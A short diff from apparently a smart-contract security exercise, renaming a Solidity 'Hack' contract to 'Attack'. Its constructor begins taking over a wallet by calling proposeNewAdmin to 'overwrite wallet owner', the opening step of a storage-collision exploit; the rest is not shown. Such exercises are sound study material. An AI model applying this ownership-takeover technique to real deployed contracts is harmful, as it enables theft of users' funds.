@@ -10,7 +10,7 @@ interface IWallet {
     function setMaxBalance(uint256 _maxBalance) external;
 }
 
-contract Hack {
+contract Attack {
     constructor(IWallet wallet) payable {
         // overwrite wallet owner
         wallet.proposeNewAdmin(address(this));
